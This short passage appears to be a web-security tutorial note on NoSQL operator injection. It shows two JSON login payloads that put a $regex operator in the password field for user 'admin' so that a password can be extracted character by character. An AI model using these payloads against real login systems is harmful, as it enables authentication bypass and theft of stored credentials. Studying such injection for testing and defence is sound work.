You may be able to extract data using operators that don't enable 
you to run JavaScript. For example, you may be able to use the $regex 
operator to extract data character by character.

using a payload like:
{"username":"admin","password":{"$regex":"^.*"}}

if the response is different then you can use this to extract data
character by character:
{"username":"admin","password":{"$regex":"^a*"}}
